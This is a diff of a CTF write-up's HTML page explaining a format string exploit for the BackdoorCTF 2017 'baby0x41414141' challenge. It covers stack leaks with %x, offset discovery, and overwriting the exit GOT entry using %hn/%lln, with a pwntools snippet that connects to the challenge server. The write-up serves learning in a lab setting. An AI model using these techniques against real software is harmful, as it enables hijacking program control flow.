@@ -16,20 +16,21 @@
   <meta http-equiv="window-target" content="_top">
   
   <title>[Pwn] BackdoorCTF 2017 - baby0x41414141 | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="![](https://i.imgur.com/pX6qbFQ.png)  *1.1 - format string vulnerability.* We have a format string vulnerability we can confirm this by running the binary: 1234$ ./32_new Hello baby pwner, whats your">
-<meta name="keywords" content="formatstring,pwn,backdoorctf">
+  <meta name="description" content="1.1 - format string vulnerability. We have a format string vulnerability we can confirm this by running the binary: 1234$ ./32_new Hello baby pwner, whats your name?%xOk cool, soon we will know whethe">
+<meta name="keywords" content="formatstring,backdoorctf,pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] BackdoorCTF 2017 - baby0x41414141">
 <meta property="og:url" content="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="![](https://i.imgur.com/pX6qbFQ.png)  *1.1 - format string vulnerability.* We have a format string vulnerability we can confirm this by running the binary: 1234$ ./32_new Hello baby pwner, whats your">
+<meta property="og:description" content="1.1 - format string vulnerability. We have a format string vulnerability we can confirm this by running the binary: 1234$ ./32_new Hello baby pwner, whats your name?%xOk cool, soon we will know whethe">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.imgur.com/pX6qbFQ.png">
 <meta property="og:image" content="https://i.imgur.com/TIY3ZzO.png">
 <meta property="og:updated_time" content="2022-08-23T00:14:55.165Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] BackdoorCTF 2017 - baby0x41414141">
-<meta name="twitter:description" content="![](https://i.imgur.com/pX6qbFQ.png)  *1.1 - format string vulnerability.* We have a format string vulnerability we can confirm this by running the binary: 1234$ ./32_new Hello baby pwner, whats your">
-<meta name="twitter:image" content="https://i.imgur.com/TIY3ZzO.png">
+<meta name="twitter:description" content="1.1 - format string vulnerability. We have a format string vulnerability we can confirm this by running the binary: 1234$ ./32_new Hello baby pwner, whats your name?%xOk cool, soon we will know whethe">
+<meta name="twitter:image" content="https://i.imgur.com/pX6qbFQ.png">
   
     <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
   
@@ -369,7 +370,7 @@
         
 		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 909 (words)</span>
+		<span class="post-wordcount hidden-xs">Word Count: 903 (words)</span>
 	
 	
 		<span class="post-readcount hidden-xs">Read Time: 6 (min)</span>
@@ -379,33 +380,24 @@
     </header>
     <div class="article-entry" itemprop="articleBody">
       
-        <a data-fancybox="gallery" href="https://i.imgur.com/pX6qbFQ.png" target="_blank" rel="noopener">
-![](https://i.imgur.com/pX6qbFQ.png)
-</a>
-*1.1 - format string vulnerability.*
+        <p><a data-fancybox="gallery" href="https://i.imgur.com/pX6qbFQ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/pX6qbFQ.png" alt><br></a><br><em>1.1 - format string vulnerability.</em></p>
 <p>We have a format string vulnerability we can confirm this by running the binary:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./32_new </span><br><span class="line">Hello baby pwner, whats your name?</span><br><span class="line">%x</span><br><span class="line">Ok cool, soon we will know whether you pwned it or not. Till <span class="keyword">then</span> Bye 8048914</span><br></pre></td></tr></table></figure>
-<p>A there it is, we leaked an address from the stack, analysing the binary again we can see we already have a cool function that calls <code>system('cat flag.txt')</code> so we don’t have to actually leak libc addresses and go through all that trouble:<br>
-<a data-fancybox="gallery" href="https://i.imgur.com/TIY3ZzO.png" target="_blank" rel="noopener"><br>
-<img src="https://i.imgur.com/TIY3ZzO.png" alt><br>
-</a><br>
-<em>1.2 - flag function.</em></p>
+<p>A there it is, we leaked an address from the stack, analysing the binary again we can see we already have a cool function that calls <code>system(&#39;cat flag.txt&#39;)</code> so we don’t have to actually leak libc addresses and go through all that trouble:<br><a data-fancybox="gallery" href="https://i.imgur.com/TIY3ZzO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/TIY3ZzO.png" alt><br></a><br><em>1.2 - flag function.</em></p>
 <p>This one is really simple:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 - Calculate the offset of the address we put in the stack using %p.</span><br><span class="line">2 - Modify the exit function address with flag function using %n.</span><br></pre></td></tr></table></figure>
 <p>Before going into an explanation I’ll show you some modifiers from <code>printf</code> man page this will be useful since we want to override a certain number of bytes and this length modifiers will help us on that.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">An optional length modifier, that specifies the size of the argument.</span><br><span class="line">         The following length modifiers are valid for the d, i, n, o, u, x, or</span><br><span class="line">         X conversion:</span><br><span class="line"></span><br><span class="line">         Modifier          d, i           o, u, x, X            n</span><br><span class="line">         hh                signed char    unsigned char         signed char *</span><br><span class="line">         h                 short          unsigned short        short *</span><br><span class="line">         l (ell)           long           unsigned long         long *</span><br><span class="line">         ll (ell ell)      long long      unsigned long long    long long *</span><br><span class="line">         j                 intmax_t       uintmax_t             intmax_t *</span><br><span class="line">         t                 ptrdiff_t      (see note)            ptrdiff_t *</span><br><span class="line">         z                 (see note)     size_t                (see note)</span><br><span class="line">         q (deprecated)    quad_t         u_quad_t              quad_t *</span><br></pre></td></tr></table></figure>
-<p>For example if we want to override an address like this <code>0x0804870b</code> this a 32 bit address so if we need to change all the bits we would use <code>%ln</code> which is a long and it’s 32 bits or we could even use <code>%lln</code> would work too since is 64 bit (long long).</p>
+<p>For example if we want to override an address like this <code>0x0804870b</code> this a 32 bit address so if we need to change all the bits we would use <code>%ln</code> which is a long and it’s 32 bits or we could even use <code>%lln</code> would work too since is 64 bit (long long). </p>
 <p>Usually we want to use <code>%hn</code> so we can override 2 bytes(16 bits) at each if we get greedy and try to override it as long when the binary prints the string output it will take a lot of time since it needs <code>0x0804870b</code> spaces to be printed, this is why we prefer to use %hn the address but this time we need to do it in two operations instead of one.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0804 -&gt; <span class="string">'%11hn'</span></span><br><span class="line">870b -&gt; <span class="string">'%10hn'</span></span><br></pre></td></tr></table></figure>
-<h3 id="stack-address-offset-calculation"><a class="markdownIt-Anchor" href="#stack-address-offset-calculation"></a> Stack address offset calculation</h3>
-<p>We can do this by printing a bunch of addresses from the stack using <code>%x</code> or <code>%p</code>, we can insert some ‘AAAA’ in the beginning and the a bunch of <code>%x</code> and check on which location the ‘AAAA’ are positioned in the stack.</p>
+<h3 id="Stack-address-offset-calculation"><a href="#Stack-address-offset-calculation" class="headerlink" title="Stack address offset calculation"></a>Stack address offset calculation</h3><p>We can do this by printing a bunch of addresses from the stack using <code>%x</code> or <code>%p</code>, we can insert some ‘AAAA’ in the beginning and the a bunch of <code>%x</code> and check on which location the ‘AAAA’ are positioned in the stack.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</span><br><span class="line">r =getConn()</span><br><span class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</span><br><span class="line">s = <span class="string">'AAAA'</span>+ <span class="string">'%x,'</span>*<span class="number">20</span></span><br><span class="line">r.sendline(s)</span><br></pre></td></tr></table></figure>
-<p>We can see our <code>41414141</code> will appear in the position 10th, we now know where its located in the stack when we put some strings in the beginning:</p>
+<p>We can see our <code>41414141</code> will appear in the position 10th, we now know where its located in the stack when we put some strings in the beginning: </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python 32_new.py </span><br><span class="line">Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA8048914,ff92ee98,1,f745c618,36e,f7462668,ff92f144,ff92eee4,ff92eee0,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,</span><br></pre></td></tr></table></figure>
 <p>To access its position we can do like this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'%10$hn'</span></span><br></pre></td></tr></table></figure>
-<h3 id="override-exit-function"><a class="markdownIt-Anchor" href="#override-exit-function"></a> Override exit function</h3>
-<p>Now we need to calculate how much characters we need to add into our format expression, for example if we needed 100 we could do it like this:</p>
+<h3 id="Override-exit-function"><a href="#Override-exit-function" class="headerlink" title="Override exit function"></a>Override exit function</h3><p>Now we need to calculate how much characters we need to add into our format expression, for example if we needed 100 we could do it like this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'%100%10$hn'</span></span><br></pre></td></tr></table></figure>
 <p>Now starting the exploit we can easily get the exit <code>GOT</code> address with <code>pwntools</code> and the flag function we can get it from radare2 you can check it at the picture 1.2 above.</p>
 <p>One nice trick is to clear the existing <code>EXIT</code> function address with <code>%10$lln</code> of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into <code>0x0000004e</code>, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing that is very cleaver, is to split the address in half using some bit operations with this we know exactly how many characters to add (of course you still need to do some debugging in <code>gdb</code>).</p>
